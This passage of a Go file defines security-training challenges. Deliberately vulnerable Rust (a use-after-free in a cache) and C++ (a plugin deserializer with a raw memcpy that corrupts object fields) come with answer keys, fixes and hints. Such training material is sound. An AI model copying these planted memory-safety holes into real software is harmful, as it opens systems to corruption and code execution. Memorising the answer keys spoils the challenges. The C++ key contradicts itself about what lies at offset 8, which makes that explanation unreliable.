    /// Insert or update a cache entry.
    fn set(&self, key: String, value: &[u8], ttl: Duration) {
        let entry = RawCacheEntry::new(value, ttl);
        let mut map = self.entries.lock().unwrap();
        map.insert(key, entry);
    }

    /// Get cached data. Returns a copy of the data if found and not expired.
    fn get(&self, key: &str) -> Option<Vec<u8>> {
        let mut map = self.entries.lock().unwrap();

        // Check if entry exists and get a raw pointer to the data
        if let Some(entry) = map.get(key) {
            if entry.is_expired() {
                // Entry expired — remove it and free memory
                map.remove(key);
                return None;
            }

            // Get pointer to data while holding the lock
            let data_ptr = entry.data().as_ptr();
            let data_len = entry.data().len();

            // Drop the lock before copying data to reduce contention
            drop(map);

            // Copy the data from the raw pointer
            let mut result = vec![0u8; data_len];
            unsafe {
                ptr::copy_nonoverlapping(data_ptr, result.as_mut_ptr(), data_len);
            }
            return Some(result);
        }

        None
    }

    /// Remove expired entries. Called periodically by a background task.
    fn evict_expired(&self) {
        let mut map = self.entries.lock().unwrap();
        map.retain(|_key, entry| !entry.is_expired());
    }

    /// Get cache statistics.
    fn stats(&self) -> (usize, usize) {
        let map = self.entries.lock().unwrap();
        let total = map.len();
        let expired = map.values().filter(|e| e.is_expired()).count();
        (total, expired)
    }
}

fn main() {
    let cache = FastCache::new();

    // Simulate cache operations
    cache.set("user:1001".to_string(), b"John Doe|Premium|2024-12-31", Duration::from_secs(3600));
    cache.set("txn:50432".to_string(), b"SETTLED|USD|1499.99|2024-01-15", Duration::from_secs(300));

    if let Some(data) = cache.get("user:1001") {
        println!("User data: {}", String::from_utf8_lossy(&data));
    }

    // Background eviction
    cache.evict_expired();

    let (total, expired) = cache.stats();
    println!("Cache stats: {} total, {} expired", total, expired);
}`,

		targetVuln: `Two critical memory safety violations:

1. CRITICAL — Use-After-Free in get() (lines 95-102): The get() method obtains raw
pointers (data_ptr, data_len) to the cache entry's data while holding the mutex lock.
It then DROPS the lock (line 100: drop(map)) before reading from those pointers
(lines 102: ptr::copy_nonoverlapping). After the lock is dropped, another thread
can call set() with the same key (which replaces and drops the old RawCacheEntry,
deallocating its memory) or evict_expired() can remove the entry. The raw pointers
now point to freed memory. Reading from freed memory is undefined behavior —
it can return garbage data, crash, or in a financial system, return incorrect
transaction amounts.

2. HIGH — Dangling reference from data() (lines 62-65): The data() method returns
a &[u8] slice that borrows from the raw pointer. However, the lifetime of this
reference is not tied to any borrow of the RawCacheEntry. If the entry is dropped
while a reference from data() still exists, it becomes a dangling reference.
The safe Rust compiler cannot catch this because the lifetime is fabricated inside
an unsafe block. In the get() method, entry.data() is called twice to get ptr and
len separately, and neither call's result is protected after the lock is dropped.

The combination means: under concurrent load, the financial transaction cache can
return corrupted data from freed memory, silently producing wrong amounts.`,

		conceptualFix: `Fix the use-after-free by copying data BEFORE dropping the lock:

fn get(&self, key: &str) -> Option<Vec<u8>> {
    let mut map = self.entries.lock().unwrap();
    if let Some(entry) = map.get(key) {
        if entry.is_expired() {
            map.remove(key);
            return None;
        }
        // Copy data while still holding the lock
        let result = entry.data().to_vec();
        return Some(result);
    }
    None
}

This ensures the entry cannot be freed while we're reading from it, because
the mutex is held during the entire read + copy operation.

For the data() method, add proper lifetime annotation:
fn data(&self) -> &[u8] is correct IF callers ensure the entry lives long enough.
Document the safety requirement or make data() return a Vec<u8> (owned copy).

Better long-term approach:
1. Use Arc<[u8]> or Bytes for zero-copy sharing without unsafe
2. Use a crate like moka or quick-cache that provides thread-safe caching
3. If unsafe is truly needed for performance, use Miri and ThreadSanitizer
   in CI to catch data races and use-after-free
4. Consider using RwLock instead of Mutex for read-heavy workloads`,

		hints: []string{
			"In the get() method, trace exactly when the mutex lock is held and when it's released. What happens to the raw pointers after drop(map)?",
			"What guarantees does Rust's borrow checker provide inside unsafe blocks? Can another thread modify the HashMap while the lock is dropped?",
			"Focus on the race condition: Thread A calls get() and drops the lock with raw pointers. Thread B calls set() with the same key. What happens to Thread A's pointers?",
		},
	}
}

// ──────────────────────────────────────────────────
// CHALLENGE 6: Level 10 — C++ Deserialization RCE (CVE-inspired)
// Type confusion via polymorphic deserialization
// ──────────────────────────────────────────────────
func challenge6_CppRCE() challengeSeed {
	return challengeSeed{
		title:        "The Shape Shifter — C++ Plugin Loader RCE",
		slug:         "cpp-deser-rce-plugin-loader",
		difficulty:   10,
		langSlug:     "cpp",
		catSlug:      "insecure-deser",
		points:       800,
		cveReference: "CVE-2021-22555 (type confusion / object lifecycle pattern)",
		vulnerableLines: []int{91, 92, 93, 94, 95, 98, 111, 113, 114, 115, 116},
		description: `A C++ application server implements a plugin system that loads and
executes user-uploaded "analysis modules." The modules are serialized C++
objects transmitted over a custom binary protocol. The server deserializes
these objects and invokes virtual methods on them.

The system has been deployed at a defense contractor for 4 years. It
processes classified data analysis pipelines. A recent internal audit
flagged the deserialization layer but the lead developer argued "the
type_id check prevents any type confusion."

This is an expert-level challenge. Find the chain of vulnerabilities that
enables remote code execution. You need to identify the type confusion,
the vtable corruption vector, and the object lifecycle flaw that makes
exploitation reliable.

CONTEXT: Compiled with g++ -O2 on x86_64 Linux. ASLR is enabled but
the binary has a large .text section with many useful gadgets. The server
runs as a dedicated service account with access to the classified data store.`,

		code: `#include <cstdint>
#include <cstring>
#include <iostream>
#include <map>
#include <memory>
#include <string>
#include <vector>
#include <functional>

// === Binary Protocol ===
// Header: [uint32_t magic][uint16_t version][uint16_t type_id][uint32_t payload_size]
// Payload: type-specific serialized data

constexpr uint32_t PROTOCOL_MAGIC = 0x504C5547; // "PLUG"
constexpr uint16_t PROTOCOL_VERSION = 2;

struct MessageHeader {
    uint32_t magic;
    uint16_t version;
    uint16_t type_id;
    uint32_t payload_size;
} __attribute__((packed));

// === Plugin Base Class ===
class PluginBase {
public:
    virtual ~PluginBase() = default;
    virtual std::string name() const = 0;
    virtual int execute(const std::vector<uint8_t>& input) = 0;
    virtual size_t memory_usage() const { return sizeof(*this); }
};

// === Concrete Plugin Types ===

// Type ID 1: Text analysis plugin
class TextAnalyzer : public PluginBase {
    std::string pattern_;
    bool case_sensitive_;
    int match_count_;

public:
    TextAnalyzer() : case_sensitive_(true), match_count_(0) {}

    std::string name() const override { return "TextAnalyzer"; }

    int execute(const std::vector<uint8_t>& input) override {
        std::string text(input.begin(), input.end());
        // Simple pattern matching
        size_t pos = 0;
        match_count_ = 0;
        while ((pos = text.find(pattern_, pos)) != std::string::npos) {
            match_count_++;
            pos += pattern_.length();
        }
        return match_count_;
    }

    void set_pattern(const std::string& p) { pattern_ = p; }
    size_t memory_usage() const override {
        return sizeof(*this) + pattern_.capacity();
    }
};

// Type ID 2: Statistical analysis plugin
class StatAnalyzer : public PluginBase {
    double* data_buffer_;
    size_t buffer_size_;
    size_t data_count_;
    double result_;

public:
    StatAnalyzer() : data_buffer_(nullptr), buffer_size_(0),
                     data_count_(0), result_(0.0) {}

    ~StatAnalyzer() override {
        delete[] data_buffer_;
    }

    std::string name() const override { return "StatAnalyzer"; }

    int execute(const std::vector<uint8_t>& input) override {
        if (data_count_ == 0) return -1;
        result_ = 0.0;
        for (size_t i = 0; i < data_count_; i++) {
            result_ += data_buffer_[i];
        }
        result_ /= static_cast<double>(data_count_);
        return 0;
    }

    void allocate(size_t count) {
        delete[] data_buffer_;
        buffer_size_ = count;
        data_count_ = count;
        data_buffer_ = new double[count];
    }

    size_t memory_usage() const override {
        return sizeof(*this) + buffer_size_ * sizeof(double);
    }
};

// === Deserialization Engine ===

class PluginDeserializer {
    // Registry of known type IDs
    static constexpr uint16_t TYPE_TEXT_ANALYZER = 1;
    static constexpr uint16_t TYPE_STAT_ANALYZER = 2;

    // Object cache for reuse (performance optimization)
    std::map<uint16_t, PluginBase*> object_cache_;

public:
    ~PluginDeserializer() {
        for (auto& [id, ptr] : object_cache_) {
            delete ptr;
        }
    }

    /// Deserialize a plugin from a binary message.
    /// Returns a pointer to the deserialized plugin (may be cached).
    PluginBase* deserialize(const uint8_t* data, size_t length) {
        if (length < sizeof(MessageHeader)) {
            std::cerr << "Message too short" << std::endl;
            return nullptr;
        }

        // Parse header
        MessageHeader header;
        std::memcpy(&header, data, sizeof(header));

        // Validate protocol
        if (header.magic != PROTOCOL_MAGIC) {
            std::cerr << "Invalid magic: " << std::hex << header.magic << std::endl;
            return nullptr;
        }
        if (header.version != PROTOCOL_VERSION) {
            std::cerr << "Unsupported version: " << header.version << std::endl;
            return nullptr;
        }

        // Validate payload size
        size_t expected_total = sizeof(MessageHeader) + header.payload_size;
        if (expected_total > length) {
            std::cerr << "Payload size mismatch" << std::endl;
            return nullptr;
        }

        const uint8_t* payload = data + sizeof(MessageHeader);

        // Check type_id and deserialize accordingly
        switch (header.type_id) {
            case TYPE_TEXT_ANALYZER:
                return deserialize_text(payload, header.payload_size);
            case TYPE_STAT_ANALYZER:
                return deserialize_stat(payload, header.payload_size);
            default:
                std::cerr << "Unknown type_id: " << header.type_id << std::endl;
                return nullptr;
        }
    }

private:
    PluginBase* deserialize_text(const uint8_t* payload, uint32_t size) {
        // Reuse or create TextAnalyzer
        TextAnalyzer* analyzer;
        if (object_cache_.count(TYPE_TEXT_ANALYZER)) {
            analyzer = static_cast<TextAnalyzer*>(object_cache_[TYPE_TEXT_ANALYZER]);
        } else {
            analyzer = new TextAnalyzer();
            object_cache_[TYPE_TEXT_ANALYZER] = analyzer;
        }

        // Deserialize pattern from payload
        // Format: [uint16_t pattern_len][char[] pattern][uint8_t case_sensitive]
        if (size < 3) return nullptr;

        uint16_t pattern_len;
        std::memcpy(&pattern_len, payload, 2);

        if (2 + pattern_len + 1 > size) return nullptr;

        std::string pattern(reinterpret_cast<const char*>(payload + 2), pattern_len);
        analyzer->set_pattern(pattern);

        return analyzer;
    }

    PluginBase* deserialize_stat(const uint8_t* payload, uint32_t size) {
        // Reuse or create StatAnalyzer
        StatAnalyzer* analyzer;
        if (object_cache_.count(TYPE_STAT_ANALYZER)) {
            analyzer = static_cast<StatAnalyzer*>(object_cache_[TYPE_STAT_ANALYZER]);
        } else {
            analyzer = new StatAnalyzer();
            object_cache_[TYPE_STAT_ANALYZER] = analyzer;
        }

        // Deserialize data buffer from payload
        // Format: [uint32_t count][double[] values]
        if (size < 4) return nullptr;

        uint32_t count;
        std::memcpy(&count, payload, 4);

        // Validate: payload must contain exactly count doubles
        if (4 + count * sizeof(double) > size) return nullptr;

        analyzer->allocate(count);

        // Copy data directly into the analyzer's buffer
        // NOTE: we trust the count validation above
        std::memcpy(
            reinterpret_cast<uint8_t*>(analyzer) + offsetof_data_buffer(),
            payload + 4,
            count * sizeof(double)
        );

        return analyzer;
    }

    /// Compute offset to StatAnalyzer::data_buffer_ contents.
    /// This is a "clever" optimization to avoid the allocate() overhead
    /// on repeated deserializations of the same type.
    static size_t offsetof_data_buffer() {
        // WARNING: This assumes specific memory layout
        // StatAnalyzer layout: [vtable_ptr][data_buffer_ptr][buffer_size][data_count][result]
        return sizeof(void*); // skip vtable pointer to reach data_buffer_ pointer
    }
};

// === Server Main Loop ===

class PluginServer {
    PluginDeserializer deserializer_;
    std::vector<std::pair<std::string, int>> results_;

public:
    void process_message(const uint8_t* data, size_t length) {
        PluginBase* plugin = deserializer_.deserialize(data, length);
        if (!plugin) {
            std::cerr << "Deserialization failed" << std::endl;
            return;
        }

        std::cout << "Executing plugin: " << plugin->name() << std::endl;
        std::cout << "Memory usage: " << plugin->memory_usage() << " bytes" << std::endl;

        // Execute with empty input for now
        std::vector<uint8_t> empty_input;
        int result = plugin->execute(empty_input);

        results_.emplace_back(plugin->name(), result);
        std::cout << "Result: " << result << std::endl;
    }

    void print_summary() const {
        std::cout << "\n=== Execution Summary ===" << std::endl;
        for (const auto& [name, result] : results_) {
            std::cout << "  " << name << ": " << result << std::endl;
        }
    }
};

int main() {
    PluginServer server;

    // Simulated incoming messages would be processed here
    // server.process_message(raw_data, raw_length);

    std::cout << "Plugin server ready." << std::endl;
    return 0;
}`,

		targetVuln: `Multiple chained vulnerabilities enabling Remote Code Execution:

1. CRITICAL — Type Confusion via Object Cache (lines 89-98, 111-117): The
object_cache_ stores PluginBase* pointers indexed by type_id. The deserialize_text()
and deserialize_stat() methods use static_cast to downcast from PluginBase* to the
concrete type WITHOUT verifying the actual dynamic type. If an attacker first sends
a TYPE_TEXT_ANALYZER message (creating a TextAnalyzer in cache slot 1), then sends
a message with type_id=1 but crafted as if it were a StatAnalyzer, the code will
static_cast the TextAnalyzer* to operate on it as if it were a TextAnalyzer —
this is fine for the text path. However, the critical flaw is in deserialize_stat():

2. CRITICAL — Arbitrary Memory Write via offsetof_data_buffer() (lines 111-117):
The deserialize_stat() method uses a MANUAL offset calculation (offsetof_data_buffer)
to write directly into the object's memory using memcpy. The offsetof_data_buffer()
returns sizeof(void*) (8 bytes on x86_64) — it claims this skips the vtable pointer
to reach data_buffer_. But this offset is WRONG: it writes to the data_buffer_ POINTER
field itself, not to the buffer it points to. An attacker can overwrite the
data_buffer_ pointer (and subsequent fields: buffer_size_, data_count_, result_)
with attacker-controlled data from the payload.

By sending a StatAnalyzer message with carefully crafted payload data, the attacker
overwrites data_buffer_ with a chosen address. When execute() is later called, it
reads from data_buffer_[i], dereferencing the attacker-controlled pointer. If the
attacker can also control vtable contents (by corrupting the vtable pointer in a
second message), they achieve arbitrary code execution.

3. The exploitation chain: (a) Send a TYPE_STAT_ANALYZER message where the "double
values" in the payload are actually crafted pointer values, (b) the memcpy overwrites
the vtable pointer and data_buffer_ pointer, (c) the next call to any virtual method
(name(), execute(), memory_usage()) dereferences the corrupted vtable → RCE.

The root cause is using manual memory layout assumptions (offsetof_data_buffer)
instead of proper deserialization through the class interface.`,

		conceptualFix: `Multiple fixes needed at different levels:

1. IMMEDIATE — Remove the manual memcpy and use the class API:
   Replace the raw memcpy with:
   analyzer->allocate(count);
   const double* src = reinterpret_cast<const double*>(payload + 4);
   for (uint32_t i = 0; i < count; i++) {
       // Use proper setter or direct array access via public API
   }
   Never write to object memory using manual offset calculations.

2. CRITICAL — Add dynamic_cast type verification:
   When retrieving from object_cache_, use dynamic_cast instead of static_cast:
   auto* analyzer = dynamic_cast<StatAnalyzer*>(object_cache_[TYPE_STAT_ANALYZER]);
   if (!analyzer) { /* type mismatch, create new */ }
   dynamic_cast performs RTTI verification and returns nullptr on type mismatch.

3. ARCHITECTURAL — Replace raw pointers with unique_ptr:
   std::map<uint16_t, std::unique_ptr<PluginBase>> object_cache_;
   This prevents memory leaks and makes ownership explicit.

4. DEFENSE IN DEPTH:
   - Add integer overflow check: count * sizeof(double) could overflow uint32_t
   - Validate count has a reasonable maximum (e.g., 1M entries)
   - Use a serialization library (protobuf, flatbuffers) instead of manual binary parsing
   - Implement W^X (write XOR execute) memory policies
   - Deploy with CFI (Control Flow Integrity) enabled: -fsanitize=cfi
   - Sign plugin messages with HMAC to prevent tampering`,

		hints: []string{
			"The offsetof_data_buffer() function makes assumptions about C++ object memory layout. What's actually at offset sizeof(void*) in a polymorphic C++ object?",
			"Trace what happens when deserialize_stat() writes data via memcpy at the computed offset. What fields of the object are being overwritten?",
			"Consider the exploitation chain: if an attacker controls the bytes written at offset 8 of the object, they control the vtable pointer. What happens when a virtual method is called?",
		},
	}
}
